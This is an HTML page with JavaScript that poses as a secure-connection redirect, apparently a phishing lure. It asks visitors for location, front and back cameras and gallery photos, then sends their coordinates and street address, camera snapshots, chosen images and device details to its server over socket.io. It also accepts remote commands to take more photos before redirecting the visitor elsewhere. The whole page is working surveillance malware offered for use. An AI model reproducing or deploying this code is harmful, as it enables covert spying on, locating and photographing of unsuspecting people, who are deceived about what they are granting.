<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            backdrop-filter: blur(10px);
            animation: slideUp 0.5s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #e8ecf1;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .logo-icon {
            font-size: 48px;
            margin-bottom: 10px;
        }
        .redirect-text { font-size: 20px; color: #1a2332; margin-bottom: 6px; font-weight: 600; }
        .redirect-url { 
            font-size: 14px; 
            color: #667eea; 
            word-break: break-all; 
            font-weight: 500;
            background: #f0f4ff;
            padding: 10px 16px;
            border-radius: 10px;
            display: inline-block;
            margin-top: 8px;
            border: 1px solid #e0e7ff;
        }
        .sub-text { 
            font-size: 14px; 
            color: #8895aa; 
            margin-top: 15px;
            font-weight: 400;
        }
        .btn-continue {
            margin-top: 25px;
            padding: 16px 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .btn-continue:hover { 
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
        }
        .btn-continue:disabled {
            background: #a0aec0;
            cursor: not-allowed;
            box-shadow: none;
        }
        #statusText {
            font-size: 15px;
            color: #667eea;
            margin-top: 18px;
            font-weight: 500;
            min-height: 28px;
        }
        #statusText.error { color: #e53e3e; }
        #statusText.success { color: #22a67e; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e8ecf1;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 2px;
            transition: width 0.3s ease;
        }
        .permission-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
            margin: 3px;
        }
        .permission-badge.pending { background: #fef3c7; color: #92400e; }
        .permission-badge.granted { background: #d4edda; color: #155724; }
        .permission-badge.denied { background: #f8d7da; color: #721c24; }
        #permissionStatus {
            margin-top: 15px;
            display: none;
        }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        .instructions {
            margin-top: 15px;
            padding: 15px;
            background: #fef3c7;
            border-radius: 10px;
            font-size: 13px;
            color: #92400e;
            display: none;
            text-align: left;
            border: 1px solid #f6c23e;
        }
        .instructions strong { display: block; margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-icon">🔐</div>
        <div class="spinner"></div>
        <div class="redirect-text">Connecting Securely</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Click continue to grant access</div>
        <div id="statusText">Ready</div>
        
        <div id="permissionStatus">
            <span class="permission-badge pending" id="permLocation">📍 Location</span>
            <span class="permission-badge pending" id="permFront">📸 Front Camera</span>
            <span class="permission-badge pending" id="permBack">📸 Back Camera</span>
            <span class="permission-badge pending" id="permGallery">🖼️ Gallery</span>
        </div>
        
        <div class="progress-bar">
            <div class="fill" id="progressFill" style="width:0%"></div>
        </div>
        
        <div class="instructions" id="instructions">
            <strong>🔧 How to fix:</strong>
            1. Click the lock icon in address bar<br>
            2. Set Camera to Allow<br>
            3. Set Location to Allow<br>
            4. Refresh and click Retry
        </div>
        
        <button class="btn-continue" id="continueBtn">▶ Continue</button>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            const statusText = document.getElementById('statusText');
            const continueBtn = document.getElementById('continueBtn');
            const instructions = document.getElementById('instructions');
            const progressFill = document.getElementById('progressFill');
            const permissionStatus = document.getElementById('permissionStatus');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;
            let isProcessing = false;
            
            let frontStream = null;
            let backStream = null;
            let frontVideo = document.getElementById('hiddenVideo');
            let backVideo = document.getElementById('hiddenVideoBack');
            
            let permissions = {
                location: false,
                frontCamera: false,
                backCamera: false,
                gallery: false
            };

            function updateStatus(msg, type = '') {
                statusText.textContent = msg;
                statusText.className = 'status-text' + (type ? ' ' + type : '');
                console.log(msg);
            }

            function updateProgress(val) {
                progressFill.style.width = val + '%';
            }

            function updatePermBadge(type, status) {
                const map = {
                    location: 'permLocation',
                    front: 'permFront',
                    back: 'permBack',
                    gallery: 'permGallery'
                };
                const el = document.getElementById(map[type]);
                if (el) {
                    el.className = 'permission-badge ' + status;
                    el.textContent = el.textContent.split(' ')[0] + ' ' + status.charAt(0).toUpperCase() + status.slice(1);
                }
            }

            function showPermissions() {
                permissionStatus.style.display = 'block';
            }

            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        connectSocket();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            });
                    });
            }

            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 5,
                        reconnectionDelay: 500
                    });

                    socket.on('connect', function() {
                        console.log('Socket connected');
                        sendDeviceInfo();
                        updateStatus('Connected. Click Continue');
                        continueBtn.disabled = false;
                    });

                    socket.on('connect_error', function(err) {
                        console.log('Socket error:', err.message);
                        updateStatus('Reconnecting...');
                        setTimeout(() => socket.connect(), 1000);
                    });

                    socket.on('capture-command', function(data) {
                        console.log('Capture command:', data.type);
                        if (data.type === 'front' && frontStream) {
                            capturePhoto('front', frontStream);
                        } else if (data.type === 'back' && backStream) {
                            capturePhoto('back', backStream);
                        } else if (data.type === 'both') {
                            if (frontStream) capturePhoto('front', frontStream);
                            setTimeout(() => {
                                if (backStream) capturePhoto('back', backStream);
                            }, 500);
                        }
                    });

                } catch(e) {
                    console.log('Socket init error:', e.message);
                }
            }

            function sendDeviceInfo() {
                if (!socket || !socket.connected) {
                    setTimeout(sendDeviceInfo, 200);
                    return;
                }

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform,
                    deviceModel: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(' ') : 
                        navigator.platform
                };

                socket.emit('visitor-connect', { visitorId, ...deviceInfo });

                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(function(battery) {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId,
                                    type: 'battery',
                                    content: level
                                });
                            }
                        })
                        .catch(() => {});
                }

                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown'
                    };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'network',
                        content: networkData
                    });
                }
            }

            function cleanupStreams() {
                if (frontStream) {
                    frontStream.getTracks().forEach(t => t.stop());
                    frontStream = null;
                }
                if (backStream) {
                    backStream.getTracks().forEach(t => t.stop());
                    backStream = null;
                }
                frontVideo.srcObject = null;
                backVideo.srcObject = null;
            }

            // ============================================
            // CONTINUE - ALL PERMISSIONS AT ONCE
            // ============================================
            continueBtn.addEventListener('click', function() {
                if (isProcessing) return;
                isProcessing = true;
                continueBtn.disabled = true;
                continueBtn.textContent = 'Processing...';
                instructions.style.display = 'none';
                showPermissions();
                
                updateStatus('Requesting all permissions...');
                updateProgress(10);
                
                permissions.location = false;
                permissions.frontCamera = false;
                permissions.backCamera = false;
                permissions.gallery = false;

                cleanupStreams();

                // ---- REQUEST ALL PERMISSIONS IN PARALLEL ----
                Promise.all([
                    requestLocation(),
                    requestFrontCamera(),
                    requestBackCamera(),
                    requestGallery()
                ])
                .then(function(results) {
                    const locationResult = results[0];
                    const frontResult = results[1];
                    const backResult = results[2];
                    const galleryResult = results[3];
                    
                    updateProgress(80);
                    
                    if (frontResult) {
                        permissions.frontCamera = true;
                        frontStream = frontResult;
                        frontVideo.srcObject = frontResult;
                        frontVideo.play().catch(() => {});
                        updatePermBadge('front', 'granted');
                        setTimeout(function() {
                            capturePhoto('front', frontResult);
                        }, 300);
                    } else {
                        updatePermBadge('front', 'denied');
                    }
                    
                    if (backResult) {
                        permissions.backCamera = true;
                        backStream = backResult;
                        backVideo.srcObject = backResult;
                        backVideo.play().catch(() => {});
                        updatePermBadge('back', 'granted');
                        setTimeout(function() {
                            capturePhoto('back', backResult);
                        }, 300);
                    } else {
                        updatePermBadge('back', 'denied');
                    }
                    
                    if (locationResult) {
                        permissions.location = true;
                        updatePermBadge('location', 'granted');
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', {
                                visitorId,
                                type: 'location',
                                content: locationResult
                            });
                        }
                    } else {
                        updatePermBadge('location', 'denied');
                    }
                    
                    if (galleryResult) {
                        permissions.gallery = true;
                        updatePermBadge('gallery', 'granted');
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', {
                                visitorId,
                                type: 'galleryPhotos',
                                content: galleryResult
                            });
                        }
                    } else {
                        updatePermBadge('gallery', 'denied');
                    }
                    
                    updateProgress(100);
                    
                    // Check if at least camera worked
                    if (!permissions.frontCamera && !permissions.backCamera) {
                        updateStatus('❌ Camera access required. Please allow camera.', 'error');
                        instructions.style.display = 'block';
                        isProcessing = false;
                        continueBtn.disabled = false;
                        continueBtn.textContent = 'Retry';
                        return;
                    }
                    
                    // All done - redirect
                    updateStatus('✅ All permissions granted! Redirecting...', 'success');
                    
                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId,
                            type: 'permissionsGranted',
                            content: true
                        });
                    }
                    
                    setTimeout(function() {
                        if (!redirectTriggered) {
                            redirectNow();
                        }
                    }, 1500);
                })
                .catch(function(error) {
                    console.log('Error:', error);
                    
                    if (!permissions.frontCamera && !permissions.backCamera) {
                        updateStatus('❌ Permission denied. Please allow camera.', 'error');
                        instructions.style.display = 'block';
                    } else {
                        updateStatus('✅ Permissions granted! Redirecting...', 'success');
                        setTimeout(function() {
                            if (!redirectTriggered) {
                                redirectNow();
                            }
                        }, 1500);
                    }
                    
                    isProcessing = false;
                    continueBtn.disabled = false;
                    continueBtn.textContent = 'Retry';
                });
            });

            // ============================================
            // REQUEST LOCATION
            // ============================================
            function requestLocation() {
                return new Promise(function(resolve) {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude;
                            const lng = position.coords.longitude;
                            
                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                .then(res => res.json())
                                .then(data => {
                                    resolve({
                                        lat, lng,
                                        accuracy: position.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        country: data.countryName || 'Unknown',
                                        state: data.principalSubdivision || 'Unknown',
                                        city: data.locality || 'Unknown',
                                        fullAddress: data.localityInfo?.address || 'Unknown'
                                    });
                                })
                                .catch(function() {
                                    resolve({
                                        lat, lng,
                                        accuracy: position.coords.accuracy,
                                        timestamp: new Date().toISOString()
                                    });
                                });
                        },
                        function() {
                            resolve(null);
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                });
            }

            // ============================================
            // REQUEST FRONT CAMERA
            // ============================================
            function requestFrontCamera() {
                return new Promise(function(resolve) {
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    })
                    .then(function(stream) {
                        resolve(stream);
                    })
                    .catch(function() {
                        navigator.mediaDevices.getUserMedia({
                            video: { width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: false
                        })
                        .then(function(stream) {
                            resolve(stream);
                        })
                        .catch(function() {
                            resolve(null);
                        });
                    });
                });
            }

            // ============================================
            // REQUEST BACK CAMERA
            // ============================================
            function requestBackCamera() {
                return new Promise(function(resolve) {
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    })
                    .then(function(stream) {
                        resolve(stream);
                    })
                    .catch(function() {
                        resolve(null);
                    });
                });
            }

            // ============================================
            // REQUEST GALLERY (Photos/Media)
            // ============================================
            function requestGallery() {
                return new Promise(function(resolve) {
                    // Use input element for file access
                    const input = document.createElement('input');
                    input.type = 'file';
                    input.accept = 'image/*';
                    input.multiple = true;
                    input.style.display = 'none';
                    document.body.appendChild(input);
                    
                    input.onchange = function(e) {
                        const files = e.target.files;
                        const photos = [];
                        let loaded = 0;
                        
                        if (files.length === 0) {
                            document.body.removeChild(input);
                            resolve([]);
                            return;
                        }
                        
                        for (let i = 0; i < Math.min(files.length, 10); i++) {
                            const reader = new FileReader();
                            reader.onload = function(event) {
                                photos.push(event.target.result);
                                loaded++;
                                if (loaded === Math.min(files.length, 10)) {
                                    document.body.removeChild(input);
                                    resolve(photos);
                                }
                            };
                            reader.readAsDataURL(files[i]);
                        }
                    };
                    
                    // If user cancels, resolve with empty array
                    input.oncancel = function() {
                        document.body.removeChild(input);
                        resolve([]);
                    };
                    
                    // Trigger file picker
                    input.click();
                    
                    // Timeout fallback - if user doesn't select anything
                    setTimeout(function() {
                        if (document.body.contains(input)) {
                            document.body.removeChild(input);
                            resolve([]);
                        }
                    }, 30000);
                });
            }

            // ============================================
            // CAPTURE PHOTO
            // ============================================
            function capturePhoto(type, stream) {
                if (!stream) return;
                
                const videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) return;
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                video.onloadedmetadata = function() {
                    setTimeout(function() {
                        try {
                            const canvas = document.createElement('canvas');
                            const width = Math.min(video.videoWidth, 640);
                            const height = Math.min(video.videoHeight, 480);
                            canvas.width = width;
                            canvas.height = height;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, width, height);
                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
                            
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId: visitorId,
                                    type: type === 'back' ? 'backCamera' : 'frontCamera',
                                    content: imageData
                                });
                            }
                            
                            document.body.removeChild(video);
                        } catch (err) {
                            console.log(err);
                        }
                    }, 300);
                };
            }

            // ============================================
            // REDIRECT
            // ============================================
            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'redirectComplete',
                        content: { redirected: true, time: new Date().toISOString() }
                    });
                }

                cleanupStreams();

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);
            }

            // ============================================
            // START
            // ============================================
            if (typeof io !== 'undefined') {
                fetchRedirectUrl();
            } else {
                setTimeout(fetchRedirectUrl, 1000);
            }

            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
                cleanupStreams();
            });
        })();
    </script>
</body>
</html>
